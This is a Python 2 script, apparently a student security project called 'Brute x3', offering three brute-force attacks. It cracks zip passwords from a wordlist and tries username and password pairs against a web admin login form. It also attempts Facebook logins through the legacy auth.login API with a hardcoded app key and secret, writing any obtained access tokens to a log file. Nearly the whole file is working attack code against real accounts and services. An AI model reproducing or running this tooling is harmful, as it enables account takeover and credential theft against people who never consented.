#!/usr/bin/env python2
from huepy import *
import zipfile
from time import *
import requests
print (orange("""  ____             _              ____  
 |  _ \           | |            |___ \ 
 | |_) |_ __ _   _| |_ ___  __  __ __) |
 |  _ <| '__| | | | __/ _ \ \ \/ /|__ < 
 | |_) | |  | |_| | ||  __/  >  < ___) |
 |____/|_|   \__,_|\__\___| /_/\_\____/             """))
print (lightred("""Information Security Project Show				
Developed By 									 
Hein Htet Aung,Pyae Phyo Hein,Ko Ko Naing,Kaung Khant Win\n"""))
print (lightgreen("Choose Brute Force Method"))
print (lightgreen("1 for Zip Password Brutforce"))
print (lightgreen("2 for Web Admin Login Brutforce"))
print (lightgreen("3 for Facebook Weak Password Brutforce"))
print (lightgreen("4 for Exit"))
inp=raw_input(">")
dictionary="dict.txt"
def zipbrute(filename):
	try:
		password=""
		condition="True"
		zip_file=zipfile.ZipFile(filename)
		with open(dictionary,'r') as zf:
			for line in zf.readlines():
				password=line.strip('\n')
				try:
					print (info("Brutforceing password with :"))+" "+password
					zip_file.extractall(pwd=password)
					print (good(blue("Password found! :")))+" "+password
					break;
					condition="False"
				except:
					sleep(5)
					pass
				if condition=="True":
					print (bad(red("Wrong Password!")))
	except KeyboardInterrupt:
		print (info("\nBye Bye"))
def webbrute(url):
	try:
		password=""
		username=""
		cond=""
		with open(dictionary,'r') as zf:
			for user in zf.readlines():
				with open(dictionary,'r') as f:
					for passwd in f.readlines():
						password=passwd.strip('\n')
						username=user.strip('\n')
						print "[!] Trying with username \""+username+"\" password  \""+password+"\""
						sleep(5)
						payload={'password':password,'sub':'Login','username':username}
						r=requests.post(url,data=payload)
						if "Invalid" in r.text:
							print (bad(red("Wrong Credential : ")))+username+" "+password
						if "Welcome" in r.text:
							print (good(purple("Username and Password found :")))+" "+username+"," +password
							cond="wtf"
							break
				if cond=="wtf":
				 	break
	except KeyboardInterrupt:
		print (info("\nBye Bye"))
def fbbrute(phonefile):
	import json, sys, hashlib, os, time
	if sys.platform in ('linux', 'linux2'):
	    W = '\x1b[0m'
	    G = '\x1b[32;1m'
	    R = '\x1b[31;1m'
	else:
	    W = ''
	    G = ''
	    R = ''
	try:
	    import requests
	except ImportError:
	    print ' '
	    print "[!] Can't import module 'requests'\n"
	    sys.exit()

	reload(sys)
	sys.setdefaultencoding('utf8')
	jml = []
	jmlgetdata = []
	n = []

	def get(data, username):
	    print W + 'username :  {} '.format(G + username)
	    try:
	        os.mkdir('cookie')
	    except OSError:
	        pass

	    b = open('cookie/token.log', 'a')
	    try:
	        r = requests.get('https://api.facebook.com/restserver.php', params=data)
	        a = json.loads(r.text)
	        b.write(a['access_token'])
	        b.write('====>' + username + '\n')
	        b.close()
	        data = a['access_token'] + '====>' + username
	        print G + '[*] found pass and successfully generate access token'	
	    except KeyError:
	        print R + '[!] Wrong Username and Password'
	    except requests.exceptions.ConnectionError:
	        pass
	def id(username, password):
	    print W + '================================'
	    id = username
	    pwd = password
	    API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
	    data = {'api_key': '882a8490361da98702bf97a021ddc14d',
	     'credentials_type': 'password',
	     'email': id,
	     'format': 'JSON',
	     'generate_machine_id': '1',
	     'generate_session_cookies': '1',
	     'locale': 'en_US',
	     'method': 'auth.login',
	     'password': pwd,
	     'return_ssl_resources': '0',
	     'v': '1.0'}
	    sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.0' + API_SECRET
	    x = hashlib.new('md5')
	    x.update(sig)
	    data.update({'sig': x.hexdigest()})
	    get(data, username)
	try:
	    with open(phonefile, 'r') as f:
	        username = f.readlines()
	    with open(phonefile, 'r') as f:
	        password = f.readlines()
	    for n,line in enumerate(open(phonefile, 'r')):
	        if n % 10 == 0:
	            time.sleep(3)
	            id(username[n],password[n])
	        else:
	            id(username[n],password[n])
	except KeyboardInterrupt:
	        print '\r[!] Good Bye'
					
while inp!="4":
	if inp=="1":
		try:
			zipname=raw_input((yellow("Enter Zip File name to Bruteforce:")))
			zipbrute(zipname)
		except IOError:
			print (bad(red("Invalid Zip File Name")))
		except KeyboardInterrupt:
			print (info("\nBye Bye"))
	if inp=="2":
		try:
			urlname=raw_input((yellow("Enter URL to Bruteforce : ")))
			webbrute(urlname)
		except Exception:
			print (bad(red("Invalid URL")))
		except KeyboardInterrupt:
			print (info("\nBye Bye"))
	if inp=="3":
		try:
			phone=raw_input((yellow("Enter Phone Wordlist file to Bruteforce : ")))
			fbbrute(phone)
		except Exception:
			print (bad(red("Invalid File")))
		except KeyboardInterrupt:
			print (info("\nBye Bye"))
	inp=raw_input(">")